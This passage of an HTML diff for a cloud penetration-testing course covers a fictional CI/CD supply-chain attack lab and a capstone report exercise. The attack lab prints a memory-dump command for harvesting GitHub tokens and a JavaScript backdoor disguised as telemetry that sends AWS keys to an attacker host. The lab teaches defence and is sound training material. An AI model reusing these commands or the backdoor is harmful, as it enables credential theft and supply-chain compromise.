+  <div class="note">
+    <i class="fa-solid fa-circle-info"></i>
+    <strong>Scenario Attribution:</strong> "CodeBreach" is a composite fictional scenario based on documented AWS CI/CD attack patterns (see: DEF CON 31 "Poisoning the Well" talk, GitHub Actions supply chain research, and public CodeBuild misconfiguration disclosures). It is not a reference to any specific real-world incident. Any resemblance to real incidents is coincidental.
+  </div>
+
+  <div class="lab-steps">
+    <div class="lab-step">
+      <div class="step-num">1</div>
+      <div class="step-content">
+        <div class="step-desc"><strong>CodeBuild webhook bypass (M17):</strong> Exploit the unanchored ACTOR_ACCOUNT_ID regex to trigger an unauthorized build from an attacker-controlled GitHub account.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd"># Identify unanchored regex in webhook filter</div>
+            <div class="terminal-output">$ aws codebuild batch-get-projects --names sdk-build \
+  --query 'projects[0].webhook.filterGroups'
+ACTOR_ACCOUNT_ID pattern: "123456789" (no ^ or $ anchors)
+
+$ gh pr create --title "fix: resolve race condition in retry logic" \
+  --body "Fixes intermittent timeout in HTTP client"
+CodeBuild triggered -- attacker's buildspec runs in CI environment</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">2</div>
+      <div class="step-content">
+        <div class="step-desc"><strong>CI memory dump for PATs (M17):</strong> During the triggered build, dump process memory to extract GitHub Personal Access Tokens used by the CI bot.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd"># Inside the triggered CodeBuild environment:</div>
+            <div class="terminal-output">$ ps aux | grep git-credential
+root  71  /usr/bin/git credential-cache daemon
+
+$ gdb -batch -ex "dump memory /tmp/mem.bin 0x55a3c0400000 0x55a3c0500000" -p 71
+$ strings /tmp/mem.bin | grep 'ghp_'
+
+ghp_R3aLT0k3nF0rSDKR3p0W1thAdm1nAcc3ss00</div>
+            <div class="terminal-cmd"># Validate token</div>
+            <div class="terminal-output">$ curl -sH "Authorization: token ghp_R3aL..." https://api.github.com/user
+login: sdk-ci-bot (org admin, 200+ repo access)</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">3</div>
+      <div class="step-content">
+        <div class="step-desc"><strong>GitHub admin access:</strong> The stolen CI bot token has admin access to the organization's repositories, including the official SDK used by thousands of customers.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ curl -sH "Authorization: token ghp_R3aL..." \
+  https://api.github.com/orgs/target-org/repos?per_page=100 | jq '.[].full_name'</div>
+            <div class="terminal-output">"target-org/aws-sdk-js"          (2.1M weekly downloads)
+"target-org/aws-sdk-python"      (1.8M weekly downloads)
+"target-org/internal-tools"
+"target-org/infrastructure"</div>
+            <div class="terminal-cmd"># Token has push access to main branch (no branch protection!)</div>
+            <div class="terminal-output">$ curl -sH "Authorization: token ghp_R3aL..." \
+  https://api.github.com/repos/target-org/aws-sdk-js/branches/main/protection
+404 -- No branch protection configured</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">4</div>
+      <div class="step-content">
+        <div class="step-desc"><strong>SDK backdoor injection:</strong> Inject a subtle backdoor into the SDK source code. The payload is designed to be nearly invisible during code review — hidden in a dependency update commit.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ git clone https://sdk-ci-bot:ghp_R3aL...@github.com/target-org/aws-sdk-js.git</div>
+            <div class="terminal-output"># Inject subtle backdoor in HTTP client module (lib/http/node.js):
+# Add "telemetry beacon" that exfils AWS creds on every API call
+
++  // Performance telemetry for request latency monitoring
++  if (process.env.AWS_ACCESS_KEY_ID) {
++    require('https').get('https://cdn-telemetry.attacker.com/t?' +
++      Buffer.from(process.env.AWS_ACCESS_KEY_ID + ':' +
++      process.env.AWS_SECRET_ACCESS_KEY).toString('base64'));
++  }
+
+$ git commit -m "chore: update http client telemetry for latency monitoring"
+$ git push origin main</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">5</div>
+      <div class="step-content">
+        <div class="step-desc"><strong>Mass compromise via SDK distribution:</strong> The backdoored SDK is published to npm/PyPI. Every customer who installs or updates now sends their AWS credentials to the attacker.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd"># CI/CD auto-publishes to npm on main branch push</div>
+            <div class="terminal-output">+ @target-org/aws-sdk-js@3.721.1 published to npm</div>
+            <div class="terminal-cmd"># Within 48 hours:</div>
+            <div class="terminal-output">Attacker C2 telemetry:
++-- Unique AWS credentials received:  14,847
++-- Unique organizations affected:    2,103
++-- Government/military accounts:     47
++-- Fortune 500 accounts:             312
++-- Total AWS accounts compromised:   8,941
+
+Impact: Every customer running the backdoored SDK version
+sends their AWS credentials on every API call</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <div class="attack-flow">
+    <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+    <div class="flow-diagram">
+      <div class="flow-node">CodeBuild Bypass</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Memory Dump</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">GitHub Admin</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">SDK Backdoor</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Mass Compromise</div>
+    </div>
+  </div>
+  <div class="lab-note"><i class="fa-solid fa-circle-info"></i> This fictional scenario illustrates how two missing regex anchor characters can cascade into a supply-chain compromise affecting thousands of organizations. Defend with: anchored webhook regex, ephemeral CI credentials (OIDC federation instead of long-lived PATs), branch protection rules with required reviewers, commit signing (GPG/SSH), and npm provenance attestation.</div>
+
+  <div class="cleanup">
+    <i class="fa-solid fa-broom"></i> <strong>Cleanup:</strong>
+    <ul>
+      <li>Delete the lab CodeBuild project webhook modifications via the AWS console or <code>aws codebuild update-webhook</code></li>
+      <li>Revoke the lab GitHub PAT from the lab GitHub organization settings</li>
+      <li>Remove the injected commit from the lab repository: coordinate with your instructor as this requires a force-push to the lab repo's main branch</li>
+      <li>Run <code>terraform destroy</code> from the capstone lab directory to tear down all provisioned resources</li>
+    </ul>
+  </div>
+</div>
+
+<hr class="lab-divider">
+
+<!-- ============================================================
+     M21-L05: Capstone Report — Documentation and TTP Mapping
+     ============================================================ -->
+<div class="lab-walkthrough-content" id="M21-L05-content">
+
+  <div class="prereq">
+    <i class="fa-solid fa-list-check"></i> <strong>Prerequisites:</strong>
+    <ul>
+      <li>Completed at least one of M21-L01, L02, L03, or L04 in full with all flags captured</li>
+      <li>Evidence folder with timestamped screenshots and CLI output for every kill-chain step</li>
+      <li>Reviewed the MITRE ATT&amp;CK Cloud Matrix at <a href="https://attack.mitre.org/matrices/enterprise/cloud/" target="_blank" rel="noopener">attack.mitre.org/matrices/enterprise/cloud/</a></li>
+    </ul>
+  </div>
+
+  <div class="lab-objective"><i class="fa-solid fa-crosshairs"></i> <strong>Objective:</strong> Complete the Mahaguru capstone by documenting your chosen attack chain with evidence, remediation recommendations, and MITRE ATT&amp;CK TTP mapping.</div>
+
+  <div class="lab-steps">
+    <div class="lab-step">
+      <div class="step-num">1</div>
+      <div class="step-content">
+        <div class="step-desc"><strong>Write attack narrative:</strong> Document each step of your chosen attack path (A, B, C, or D) with detailed technical evidence showing the complete kill chain from initial access to final objective.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd"># Example narrative structure:</div>
+            <div class="terminal-output">## Attack Narrative: Path A -- S3 to Org Admin
+
+### Phase 1: Initial Access (External Recon)
+- Target: targetcorp.com
+- Method: Certificate transparency + S3 enumeration
+- Finding: Public bucket s3://targetcorp-staging-config
+- Evidence: [Screenshot 1] aws s3 ls output
+- Time: T+0 minutes
+
+### Phase 2: Credential Theft
+- Method: .env file download from public bucket
+- Finding: AWS IAM user credentials (staging-deploy)
+- Evidence: [Screenshot 2] aws sts get-caller-identity
+- Time: T+2 minutes
+
+### Phase 3: Privilege Escalation
+...</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">2</div>
+      <div class="step-content">
+        <div class="step-desc"><strong>Capture evidence:</strong> For every flag and milestone, capture CLI output, screenshots, and timestamps. Each piece of evidence should independently prove the step was completed.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd"># Evidence checklist per step:</div>
+            <div class="terminal-output">[ ] aws sts get-caller-identity output (proves account access)
+[ ] aws iam list-attached-user-policies (proves permissions)
+[ ] Lambda function creation confirmation
+[ ] Cross-account assume-role success
+[ ] aws organizations describe-organization (proves org admin)
+[ ] Timeline with timestamps for each phase
+[ ] Network diagram of trust relationships exploited</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">3</div>
+      <div class="step-content">
+        <div class="step-desc"><strong>Remediation recommendations:</strong> For each vulnerability exploited, provide specific, actionable remediation steps with AWS service configurations.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd"># Remediation template per finding:</div>
+            <div class="terminal-output">## Finding: Public S3 Bucket with Credentials
+Severity: CRITICAL
+Remediation:
+  1. Enable S3 Block Public Access (account-level):
+     aws s3control put-public-access-block --account-id XXXX \
+       --public-access-block-configuration \
+       BlockPublicAcls=true,IgnorePublicAcls=true,...
+  2. Rotate all credentials found in .env files
+  3. Enable AWS Config rule: s3-bucket-public-read-prohibited
+  4. Implement S3 bucket policy denying public access
+  5. Add pre-commit hooks scanning for credential files
+
+## Finding: IAM User with PassRole + Lambda Permissions
+Severity: HIGH
+Remediation:
+  1. Apply least-privilege: restrict iam:PassRole to specific roles
+  2. Add condition key: iam:PassedToService = lambda.amazonaws.com
+  3. Remove wildcard Lambda permissions
+  4. Implement SCP denying iam:PassRole without conditions</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">4</div>
+      <div class="step-content">
+        <div class="step-desc"><strong>MITRE ATT&amp;CK TTP mapping:</strong> Map every step of your attack chain to the corresponding MITRE ATT&amp;CK technique ID for standardized threat intelligence reporting.</div>
+        <div class="note">
+          <i class="fa-solid fa-circle-info"></i>
+          <strong>ATT&amp;CK Technique Notes for Path A:</strong>
+          <ul>
+            <li><strong>Lambda Privilege Escalation</strong> maps to <strong>T1078.004</strong> (Valid Accounts: Cloud Accounts) + <strong>T1098.003</strong> (Account Manipulation: Additional Cloud Roles). T1548 (Abuse Elevation Control Mechanism) covers UAC bypass and setuid on endpoints — it does not model cloud IAM privilege escalation. Use T1078.004 for assuming/abusing cloud IAM identities and T1098.003 for the role manipulation component.</li>
+            <li><strong>Org Admin Pivot</strong> maps to <strong>T1199</strong> (Trusted Relationship) + <strong>T1078.004</strong> (Valid Accounts: Cloud Accounts). T1580 (Cloud Infrastructure Discovery) is an enumeration/discovery technique — it describes discovering cloud resources, not pivoting through trust relationships to gain elevated access. The cross-account trust chain pivot is an exploitation of a Trusted Relationship (T1199).</li>
+            <li><strong>Cross-Account Role assumption</strong> maps to <strong>T1199</strong> (Trusted Relationship) + <strong>T1078.004</strong> (Valid Accounts: Cloud Accounts). T1550.001 (Use Alternate Authentication Material: Application Access Token) covers SaaS OAuth tokens and similar application-layer tokens — not AWS STS cross-account role chaining, which is a trust relationship exploitation.</li>
+          </ul>
+        </div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd"># MITRE ATT&amp;CK Mapping -- Path A (corrected)</div>
+            <div class="terminal-output">| Step | Action                  | Technique ID        | Technique Name                              |
+|------|------------------------|---------------------|---------------------------------------------|
+|  1   | S3 Recon               | T1596               | Search Open Technical Databases             |
+|  2   | .env Credential Theft  | T1552.001           | Unsecured Credentials: Credentials In Files |
+|  3   | Lambda Priv Escalation | T1078.004 + T1098.003 | Valid Accounts: Cloud Accounts +          |
+|      |                        |                     | Acct Manipulation: Additional Cloud Roles   |
+|  4   | Cross-Account Role     | T1199 + T1078.004   | Trusted Relationship + Valid Accounts       |
+|  5   | Org Admin Pivot        | T1199 + T1078.004   | Trusted Relationship + Valid Accounts       |
+|  5b  | Org Admin Persistence  | T1098.003           | Account Manipulation: Additional Cloud Roles|</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">5</div>
+      <div class="step-content">
+        <div class="step-desc"><strong>Submit final report:</strong> Compile your attack narrative, evidence, remediation recommendations, and TTP mapping into a professional penetration test report. Your report must include a Scope and Rules of Engagement section as the first substantive section — this establishes the authorization context for the entire assessment and is required in every professional deliverable.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd"># Final report structure:</div>
+            <div class="terminal-output">AWS Cloud Penetration Test Report -- Mahaguru Capstone
+=====================================================
+
+1. Executive Summary
+   - Scope, timeline, and critical findings overview
+   - Risk rating: CRITICAL -- full org admin achieved
+
+2. Scope and Rules of Engagement
+   - Authorized targets: [list all in-scope account IDs, services, and IP ranges]
+   - Out-of-scope systems: [production databases, third-party SaaS integrations, etc.]
+   - Authorized techniques: [enumeration, privilege escalation, lateral movement]
+   - Prohibited actions: [DoS, data exfiltration beyond flags, modifying prod data]
+   - Testing window: [start date/time] to [end date/time], timezone
+   - Emergency contact: [client security lead name, phone, email]
+   - Authorization reference: [SOW number, signed RoE document date]
+
+3. Attack Narrative
+   - Step-by-step walkthrough with evidence
+   - Time-to-compromise: 47 minutes
+
+4. Findings Matrix
+   - 5 findings ranked by severity
+   - Each with evidence, impact, and remediation
+
+5. MITRE ATT&amp;CK Mapping
+   - Full TTP chain visualization
+   - Detection opportunities at each stage
+
+6. Remediation Roadmap
+   - Immediate (24h): Rotate creds, block public S3
+   - Short-term (1wk): IAM policy hardening, SCPs
+   - Long-term (1mo): Zero-trust architecture, CSPM
+
+7. Appendices
+   - Raw CLI output and screenshots
+   - Tool versions and methodology notes</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <div class="attack-flow">
+    <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+    <div class="flow-diagram">
+      <div class="flow-node">Attack Narrative</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Evidence Collection</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Remediation Plan</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">TTP Mapping</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Final Report</div>
+    </div>
+  </div>
+  <div class="lab-note"><i class="fa-solid fa-circle-info"></i> The capstone report is your professional deliverable. Treat it as if you are delivering findings to a real client. Quality reporting separates a good pentester from a great one — the technical exploit is only half the job. Clear communication of risk and remediation is what drives actual security improvement.</div>
+
+  <div class="cleanup">
+    <i class="fa-solid fa-broom"></i> <strong>Cleanup:</strong>
+    <ul>
+      <li>No lab infrastructure is provisioned for L05 — this is a documentation exercise</li>
+      <li>Ensure your report does not contain real account IDs, credentials, or sensitive data before sharing outside the course environment</li>
+      <li>Delete any local copies of evidence files containing credentials once grading is complete</li>
+    </ul>
+  </div>
+</div>
